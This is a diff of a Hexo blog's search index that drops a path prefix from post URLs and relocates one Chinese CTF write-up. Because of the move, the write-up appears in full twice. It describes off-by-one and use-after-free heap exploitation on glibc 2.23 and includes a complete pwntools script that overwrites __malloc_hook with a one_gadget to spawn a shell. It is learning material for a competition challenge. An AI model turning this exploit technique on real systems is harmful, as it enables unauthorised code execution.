@@ -2,7 +2,7 @@
 <search>
   <entry>
     <title>2021长安杯-pwn</title>
-    <url>/H.greed/2021/09/25/2021%E9%95%BF%E5%AE%89%E6%9D%AF-pwn/</url>
+    <url>/2021/09/25/2021%E9%95%BF%E5%AE%89%E6%9D%AF-pwn/</url>
     <content><![CDATA[<p>高质量比赛，下辈子再来（</p>
 <span id="more"></span>
 
@@ -20,7 +20,7 @@
   </entry>
   <entry>
     <title>HRP-转生web人</title>
-    <url>/H.greed/2021/09/27/HRP-%E8%BD%AC%E7%94%9Fweb%E4%BA%BA/</url>
+    <url>/2021/09/27/HRP-%E8%BD%AC%E7%94%9Fweb%E4%BA%BA/</url>
     <content><![CDATA[<p>和人合资买了SHOW的vip，pwn好卷，于是打算双开了（也许三开？偶尔逆向）</p>
 <span id="more"></span>
 
@@ -73,7 +73,7 @@
   </entry>
   <entry>
     <title>Hello World</title>
-    <url>/H.greed/2021/09/14/hello-world/</url>
+    <url>/2021/09/14/hello-world/</url>
     <content><![CDATA[<p>Welcome to <a href="https://hexo.io/">Hexo</a>! This is your very first post. Check <a href="https://hexo.io/docs/">documentation</a> for more info. If you get any problems when using Hexo, you can find the answer in <a href="https://hexo.io/docs/troubleshooting.html">troubleshooting</a> or you can ask me on <a href="https://github.com/hexojs/hexo/issues">GitHub</a>.</p>
 <span id="more"></span>
 
@@ -93,7 +93,7 @@
   </entry>
   <entry>
     <title>how2heap</title>
-    <url>/H.greed/2021/08/29/how2heap/</url>
+    <url>/2021/08/29/how2heap/</url>
     <content><![CDATA[<p>HWO 2 HEAP</p>
 <span id="more"></span>
 
@@ -133,7 +133,7 @@
   </entry>
   <entry>
     <title>堆学习_remake</title>
-    <url>/H.greed/2021/10/05/%E5%A0%86%E5%AD%A6%E4%B9%A0-remake/</url>
+    <url>/2021/10/05/%E5%A0%86%E5%AD%A6%E4%B9%A0-remake/</url>
     <content><![CDATA[<p>记录内容借鉴来源<a href="https://www.yuque.com/cyberangel/rg9gdm/vsh3kd">https://www.yuque.com/cyberangel/rg9gdm/vsh3kd</a></p>
 <span id="more"></span>
 
@@ -228,7 +228,7 @@
   </entry>
   <entry>
     <title>整数溢出unlink</title>
-    <url>/H.greed/2021/09/14/%E6%95%B4%E6%95%B0%E6%BA%A2%E5%87%BAunlink/</url>
+    <url>/2021/09/14/%E6%95%B4%E6%95%B0%E6%BA%A2%E5%87%BAunlink/</url>
     <content><![CDATA[<h1 id="zctf-2016-note3"><a href="#zctf-2016-note3" class="headerlink" title="zctf_2016_note3"></a>zctf_2016_note3</h1><p>整数溢出的unlink，在edit功能里面造成了整数溢出</p>
 <p>，这个题目的排布也很神奇，原本在heap[-1]处就存在一个堆指针。。。。</p>
 <p>所以溢出成-1大小是无限的</p>
@@ -240,7 +240,7 @@
   </entry>
   <entry>
     <title>天翼杯</title>
-    <url>/H.greed/2021/09/28/%E5%A4%A9%E7%BF%BC%E6%9D%AF/</url>
+    <url>/2021/09/28/%E5%A4%A9%E7%BF%BC%E6%9D%AF/</url>
     <content><![CDATA[<p>我是废物！！！！（超大声）</p>
 <span id="more"></span>
 
@@ -259,7 +259,7 @@
   </entry>
   <entry>
     <title>绿城杯pwn1-3</title>
-    <url>/H.greed/2021/09/30/%E7%BB%BF%E5%9F%8E%E6%9D%AFpwn1-3/</url>
+    <url>/2021/09/30/%E7%BB%BF%E5%9F%8E%E6%9D%AFpwn1-3/</url>
     <content><![CDATA[<p>=-=，不想评价这次的绿城，打过的话懂得都懂yue</p>
 <span id="more"></span>
 
@@ -288,7 +288,7 @@
   </entry>
   <entry>
     <title>记一次自己出的REPWN</title>
-    <url>/H.greed/2021/09/17/%E8%AE%B0%E4%B8%80%E6%AC%A1%E8%87%AA%E5%B7%B1%E5%87%BA%E7%9A%84REPWN/</url>
+    <url>/2021/09/17/%E8%AE%B0%E4%B8%80%E6%AC%A1%E8%87%AA%E5%B7%B1%E5%87%BA%E7%9A%84REPWN/</url>
     <content><![CDATA[<p>自己最近在学逆向，想着把re和pwn结合，结果因为pwn的问题反而困扰了自己很久，好在最后搞定了。</p>
 <span id="more"></span>
 
@@ -308,36 +308,8 @@
 ]]></content>
   </entry>
   <entry>
-    <title>长城杯pwn1</title>
-    <url>/H.greed/2021/09/20/%E9%95%BF%E5%9F%8E%E6%9D%AFpwn1/</url>
-    <content><![CDATA[<p>题目存在off by one 以及UAF漏洞</p>
-<p>我们可以利用爆破</p>
-<p>低字节修改到malloc-0x23</p>
-<p>以及改变fastbin堆的fd指向unsortedbin堆</p>
-<p>这样就能在下次申请的时候把这个unsortedbin拉进fastbin</p>
-<p>我们只要改这个unsortedbin的fd指针就可以生效了，低字节修改到malloc-0x23。</p>
-<p>再去利用off by one修改unsortedbin的大小为fastbin的大小</p>
-<p>连续申请两次就可以在heaparry上得到libc的指针</p>
-<p>接着再去把unsortedbin的fd改为0，bk改为__memalign_hook(在malloc-0x10上)</p>
-<p>再去利用off by one 把unsortedbin大小复原</p>
-<p>申请和unsortedbin大小一样的chunk去复原不然无法通过检测</p>
-<p>最后利用onegadget打malloc_hook</p>
-<p>利用</p>
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line"># malloc不符合onegadget触发条件</span><br><span class="line"># malloc_printerr触发malloc_hook</span><br></pre></td></tr></table></figure>
-
-<p>最后double的时候即可触发啦</p>
-<span id="more"></span>
-
-
-
-<p>exp</p>
-<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">import</span> time</span><br><span class="line"><span class="comment"># context.log_level = &#x27;debug&#x27;</span></span><br><span class="line"></span><br><span class="line">local = <span class="number">1</span></span><br><span class="line">libc_path = <span class="string">&#x27;/home/q/Desktop/glibc-all-in-one/libs/2.23-0ubuntu11.3_amd64/libc-2.23.so&#x27;</span></span><br><span class="line">target = <span class="string">&#x27;&#x27;</span>.split(<span class="string">&#x27;:&#x27;</span>)</span><br><span class="line">target_libc = <span class="string">&#x27;&#x27;</span></span><br><span class="line">ogg = [<span class="number">0xf03a4</span>,<span class="number">0xf1247</span>]</span><br><span class="line"></span><br><span class="line">r = <span class="keyword">lambda</span> : p.recv()</span><br><span class="line">rx = <span class="keyword">lambda</span> x: p.recv(x)</span><br><span class="line">ru = <span class="keyword">lambda</span> x: p.recvuntil(x)</span><br><span class="line">rud = <span class="keyword">lambda</span> x: p.recvuntil(x, drop=<span class="literal">True</span>)</span><br><span class="line">s = <span class="keyword">lambda</span> x: p.send(x)</span><br><span class="line">sl = <span class="keyword">lambda</span> x: p.sendline(x)</span><br><span class="line">sa = <span class="keyword">lambda</span> x, y: p.sendafter(x, y)</span><br><span class="line">sla = <span class="keyword">lambda</span> x, y: p.sendlineafter(x, y)</span><br><span class="line">debug = <span class="keyword">lambda</span> : gdb.attach(p)</span><br><span class="line">shell = <span class="keyword">lambda</span> : p.interactive()</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">add</span>(<span class="params">idx,size</span>):</span></span><br><span class="line">	sa(<span class="string">&#x27;&gt;&gt; \n&#x27;</span>,<span class="string">&#x27;1&#x27;</span>)</span><br><span class="line">	sa(<span class="string">&#x27;input index:\n&#x27;</span>,<span class="built_in">str</span>(idx))</span><br><span class="line">	sa(<span class="string">&#x27;input size:\n&#x27;</span>,<span class="built_in">str</span>(size))</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">edit</span>(<span class="params">idx,con</span>):</span></span><br><span class="line">	sa(<span class="string">&#x27;&gt;&gt; \n&#x27;</span>,<span class="string">&#x27;3&#x27;</span>)</span><br><span class="line">	sa(<span class="string">&#x27;input index:\n&#x27;</span>,<span class="built_in">str</span>(idx))</span><br><span class="line">	sla(<span class="string">&#x27;input context:\n&#x27;</span>,con)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">free</span>(<span class="params">idx</span>):</span></span><br><span class="line">	sa(<span class="string">&#x27;&gt;&gt; \n&#x27;</span>,<span class="string">&#x27;2&#x27;</span>)</span><br><span class="line">	sa(<span class="string">&#x27;input index:\n&#x27;</span>,<span class="built_in">str</span>(idx))</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> local:</span><br><span class="line">	p = process(<span class="string">&#x27;./pwn&#x27;</span>)</span><br><span class="line">	libc = ELF(libc_path)</span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">	p = remote(target[<span class="number">0</span>],target[<span class="number">1</span>])</span><br><span class="line">	libc = ELF(target_libc)</span><br><span class="line"></span><br><span class="line">sa(<span class="string">&#x27;&gt;&gt; \n&#x27;</span>,<span class="string">&#x27;666&#x27;</span>)</span><br><span class="line">base = <span class="built_in">int</span>(rud(<span class="string">&#x27;\n&#x27;</span>),<span class="number">16</span>)-libc.sym[<span class="string">&#x27;printf&#x27;</span>]</span><br><span class="line">malloc_hook = base+libc.sym[<span class="string">&#x27;__malloc_hook&#x27;</span>]</span><br><span class="line">m_hook = malloc_hook&amp;<span class="number">0xff</span></span><br><span class="line">success(<span class="built_in">hex</span>(m_hook))</span><br><span class="line"></span><br><span class="line">add(<span class="number">0</span>,<span class="number">0x68</span>)</span><br><span class="line">add(<span class="number">1</span>,<span class="number">0xe0</span>)</span><br><span class="line">add(<span class="number">2</span>,<span class="number">0x60</span>)</span><br><span class="line">free(<span class="number">0</span>)</span><br><span class="line">free(<span class="number">2</span>)</span><br><span class="line">free(<span class="number">0</span>)</span><br><span class="line">free(<span class="number">1</span>)</span><br><span class="line">edit(<span class="number">1</span>,<span class="string">&#x27;\xed\x1a&#x27;</span>)</span><br><span class="line"><span class="comment">#gdb.attach(p)</span></span><br><span class="line">edit(<span class="number">0</span>,<span class="string">&#x27;\x70\x80&#x27;</span>)</span><br><span class="line"><span class="comment">#gdb.attach(p)</span></span><br><span class="line">add(<span class="number">3</span>,<span class="number">0x68</span>)<span class="comment">#0 and 3</span></span><br><span class="line"><span class="comment">#gdb.attach(p)</span></span><br><span class="line"></span><br><span class="line">edit(<span class="number">3</span>,<span class="string">&#x27;a&#x27;</span>*<span class="number">0x68</span>+<span class="string">&#x27;\x71&#x27;</span>)</span><br><span class="line"><span class="comment">#gdb.attach(p)</span></span><br><span class="line"></span><br><span class="line">add(<span class="number">4</span>,<span class="number">0x68</span>)<span class="comment">#1 and 4</span></span><br><span class="line">add(<span class="number">5</span>,<span class="number">0x68</span>)<span class="comment">#malloc_hook-0x23</span></span><br><span class="line"><span class="comment">#gdb.attach(p)</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">edit(<span class="number">1</span>,p64(<span class="number">0</span>)+<span class="string">&#x27;\x00&#x27;</span>)</span><br><span class="line"><span class="comment">#gdb.attach(p)</span></span><br><span class="line">edit(<span class="number">0</span>,<span class="string">&#x27;a&#x27;</span>*<span class="number">0x68</span>+<span class="string">&#x27;\xf1&#x27;</span>)</span><br><span class="line"><span class="comment">#gdb.attach(p)</span></span><br><span class="line">add(<span class="number">6</span>,<span class="number">0xe0</span>)</span><br><span class="line"><span class="comment">#gdb.attach(p)</span></span><br><span class="line">one = (base+ogg[<span class="number">0</span>])</span><br><span class="line">pl = <span class="string">&#x27;a&#x27;</span>*<span class="number">19</span>+p8(one&amp;<span class="number">0xff</span>)+p8((one&gt;&gt;<span class="number">8</span>)&amp;<span class="number">0xff</span>)+p8((one&gt;&gt;<span class="number">16</span>)&amp;<span class="number">0xff</span>)</span><br><span class="line">edit(<span class="number">5</span>,pl)</span><br><span class="line"><span class="comment">#gdb.attach(p)</span></span><br><span class="line">free(<span class="number">0</span>)</span><br><span class="line">free(<span class="number">0</span>)</span><br><span class="line">shell()</span><br><span class="line"></span><br></pre></td></tr></table></figure>
-
-]]></content>
-  </entry>
-  <entry>
     <title>逆向学习记录</title>
-    <url>/H.greed/2021/09/15/%E9%80%86%E5%90%91%E5%AD%A6%E4%B9%A0%E8%AE%B0%E5%BD%95/</url>
+    <url>/2021/09/15/%E9%80%86%E5%90%91%E5%AD%A6%E4%B9%A0%E8%AE%B0%E5%BD%95/</url>
     <content><![CDATA[<p>RE</p>
 <span id="more"></span>
 
@@ -586,6 +558,34 @@
 <p>Python永远滴神吹爆</p>
 <p>maketrans()方法的作用就是起到自定义字符串替换的效果，这样就省去了脚本寻找的代码编写时间</p>
 <h3 id="exp-11"><a href="#exp-11" class="headerlink" title="exp"></a>exp</h3><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> base64</span><br><span class="line">table = <span class="string">&#x27;ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/=&#x27;</span></span><br><span class="line">model = <span class="built_in">list</span>(<span class="string">&quot;ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/=&quot;</span>)</span><br><span class="line">s = <span class="string">&quot;d2G0ZjLwHjS7DmOzZAY0X2lzX3CoZV9zdNOydO9vZl9yZXZlcnGlfD==&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">10</span>):</span><br><span class="line">    model[i], model[<span class="number">19</span>-i] = model[<span class="number">19</span>-i], model[i]</span><br><span class="line"></span><br><span class="line">model = <span class="string">&#x27;&#x27;</span>.join(model)</span><br><span class="line"></span><br><span class="line">table = <span class="built_in">str</span>.maketrans(model, table)</span><br><span class="line"><span class="built_in">print</span> (base64.b64decode(s.translate(table)))</span><br><span class="line"></span><br></pre></td></tr></table></figure>
+
+]]></content>
+  </entry>
+  <entry>
+    <title>长城杯pwn1</title>
+    <url>/2021/09/20/%E9%95%BF%E5%9F%8E%E6%9D%AFpwn1/</url>
+    <content><![CDATA[<p>题目存在off by one 以及UAF漏洞</p>
+<p>我们可以利用爆破</p>
+<p>低字节修改到malloc-0x23</p>
+<p>以及改变fastbin堆的fd指向unsortedbin堆</p>
+<p>这样就能在下次申请的时候把这个unsortedbin拉进fastbin</p>
+<p>我们只要改这个unsortedbin的fd指针就可以生效了，低字节修改到malloc-0x23。</p>
+<p>再去利用off by one修改unsortedbin的大小为fastbin的大小</p>
+<p>连续申请两次就可以在heaparry上得到libc的指针</p>
+<p>接着再去把unsortedbin的fd改为0，bk改为__memalign_hook(在malloc-0x10上)</p>
+<p>再去利用off by one 把unsortedbin大小复原</p>
+<p>申请和unsortedbin大小一样的chunk去复原不然无法通过检测</p>
+<p>最后利用onegadget打malloc_hook</p>
+<p>利用</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line"># malloc不符合onegadget触发条件</span><br><span class="line"># malloc_printerr触发malloc_hook</span><br></pre></td></tr></table></figure>
+
+<p>最后double的时候即可触发啦</p>
+<span id="more"></span>
+
+
+
+<p>exp</p>
+<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">import</span> time</span><br><span class="line"><span class="comment"># context.log_level = &#x27;debug&#x27;</span></span><br><span class="line"></span><br><span class="line">local = <span class="number">1</span></span><br><span class="line">libc_path = <span class="string">&#x27;/home/q/Desktop/glibc-all-in-one/libs/2.23-0ubuntu11.3_amd64/libc-2.23.so&#x27;</span></span><br><span class="line">target = <span class="string">&#x27;&#x27;</span>.split(<span class="string">&#x27;:&#x27;</span>)</span><br><span class="line">target_libc = <span class="string">&#x27;&#x27;</span></span><br><span class="line">ogg = [<span class="number">0xf03a4</span>,<span class="number">0xf1247</span>]</span><br><span class="line"></span><br><span class="line">r = <span class="keyword">lambda</span> : p.recv()</span><br><span class="line">rx = <span class="keyword">lambda</span> x: p.recv(x)</span><br><span class="line">ru = <span class="keyword">lambda</span> x: p.recvuntil(x)</span><br><span class="line">rud = <span class="keyword">lambda</span> x: p.recvuntil(x, drop=<span class="literal">True</span>)</span><br><span class="line">s = <span class="keyword">lambda</span> x: p.send(x)</span><br><span class="line">sl = <span class="keyword">lambda</span> x: p.sendline(x)</span><br><span class="line">sa = <span class="keyword">lambda</span> x, y: p.sendafter(x, y)</span><br><span class="line">sla = <span class="keyword">lambda</span> x, y: p.sendlineafter(x, y)</span><br><span class="line">debug = <span class="keyword">lambda</span> : gdb.attach(p)</span><br><span class="line">shell = <span class="keyword">lambda</span> : p.interactive()</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">add</span>(<span class="params">idx,size</span>):</span></span><br><span class="line">	sa(<span class="string">&#x27;&gt;&gt; \n&#x27;</span>,<span class="string">&#x27;1&#x27;</span>)</span><br><span class="line">	sa(<span class="string">&#x27;input index:\n&#x27;</span>,<span class="built_in">str</span>(idx))</span><br><span class="line">	sa(<span class="string">&#x27;input size:\n&#x27;</span>,<span class="built_in">str</span>(size))</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">edit</span>(<span class="params">idx,con</span>):</span></span><br><span class="line">	sa(<span class="string">&#x27;&gt;&gt; \n&#x27;</span>,<span class="string">&#x27;3&#x27;</span>)</span><br><span class="line">	sa(<span class="string">&#x27;input index:\n&#x27;</span>,<span class="built_in">str</span>(idx))</span><br><span class="line">	sla(<span class="string">&#x27;input context:\n&#x27;</span>,con)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">free</span>(<span class="params">idx</span>):</span></span><br><span class="line">	sa(<span class="string">&#x27;&gt;&gt; \n&#x27;</span>,<span class="string">&#x27;2&#x27;</span>)</span><br><span class="line">	sa(<span class="string">&#x27;input index:\n&#x27;</span>,<span class="built_in">str</span>(idx))</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> local:</span><br><span class="line">	p = process(<span class="string">&#x27;./pwn&#x27;</span>)</span><br><span class="line">	libc = ELF(libc_path)</span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">	p = remote(target[<span class="number">0</span>],target[<span class="number">1</span>])</span><br><span class="line">	libc = ELF(target_libc)</span><br><span class="line"></span><br><span class="line">sa(<span class="string">&#x27;&gt;&gt; \n&#x27;</span>,<span class="string">&#x27;666&#x27;</span>)</span><br><span class="line">base = <span class="built_in">int</span>(rud(<span class="string">&#x27;\n&#x27;</span>),<span class="number">16</span>)-libc.sym[<span class="string">&#x27;printf&#x27;</span>]</span><br><span class="line">malloc_hook = base+libc.sym[<span class="string">&#x27;__malloc_hook&#x27;</span>]</span><br><span class="line">m_hook = malloc_hook&amp;<span class="number">0xff</span></span><br><span class="line">success(<span class="built_in">hex</span>(m_hook))</span><br><span class="line"></span><br><span class="line">add(<span class="number">0</span>,<span class="number">0x68</span>)</span><br><span class="line">add(<span class="number">1</span>,<span class="number">0xe0</span>)</span><br><span class="line">add(<span class="number">2</span>,<span class="number">0x60</span>)</span><br><span class="line">free(<span class="number">0</span>)</span><br><span class="line">free(<span class="number">2</span>)</span><br><span class="line">free(<span class="number">0</span>)</span><br><span class="line">free(<span class="number">1</span>)</span><br><span class="line">edit(<span class="number">1</span>,<span class="string">&#x27;\xed\x1a&#x27;</span>)</span><br><span class="line"><span class="comment">#gdb.attach(p)</span></span><br><span class="line">edit(<span class="number">0</span>,<span class="string">&#x27;\x70\x80&#x27;</span>)</span><br><span class="line"><span class="comment">#gdb.attach(p)</span></span><br><span class="line">add(<span class="number">3</span>,<span class="number">0x68</span>)<span class="comment">#0 and 3</span></span><br><span class="line"><span class="comment">#gdb.attach(p)</span></span><br><span class="line"></span><br><span class="line">edit(<span class="number">3</span>,<span class="string">&#x27;a&#x27;</span>*<span class="number">0x68</span>+<span class="string">&#x27;\x71&#x27;</span>)</span><br><span class="line"><span class="comment">#gdb.attach(p)</span></span><br><span class="line"></span><br><span class="line">add(<span class="number">4</span>,<span class="number">0x68</span>)<span class="comment">#1 and 4</span></span><br><span class="line">add(<span class="number">5</span>,<span class="number">0x68</span>)<span class="comment">#malloc_hook-0x23</span></span><br><span class="line"><span class="comment">#gdb.attach(p)</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">edit(<span class="number">1</span>,p64(<span class="number">0</span>)+<span class="string">&#x27;\x00&#x27;</span>)</span><br><span class="line"><span class="comment">#gdb.attach(p)</span></span><br><span class="line">edit(<span class="number">0</span>,<span class="string">&#x27;a&#x27;</span>*<span class="number">0x68</span>+<span class="string">&#x27;\xf1&#x27;</span>)</span><br><span class="line"><span class="comment">#gdb.attach(p)</span></span><br><span class="line">add(<span class="number">6</span>,<span class="number">0xe0</span>)</span><br><span class="line"><span class="comment">#gdb.attach(p)</span></span><br><span class="line">one = (base+ogg[<span class="number">0</span>])</span><br><span class="line">pl = <span class="string">&#x27;a&#x27;</span>*<span class="number">19</span>+p8(one&amp;<span class="number">0xff</span>)+p8((one&gt;&gt;<span class="number">8</span>)&amp;<span class="number">0xff</span>)+p8((one&gt;&gt;<span class="number">16</span>)&amp;<span class="number">0xff</span>)</span><br><span class="line">edit(<span class="number">5</span>,pl)</span><br><span class="line"><span class="comment">#gdb.attach(p)</span></span><br><span class="line">free(<span class="number">0</span>)</span><br><span class="line">free(<span class="number">0</span>)</span><br><span class="line">shell()</span><br><span class="line"></span><br></pre></td></tr></table></figure>
 
 ]]></content>
   </entry>
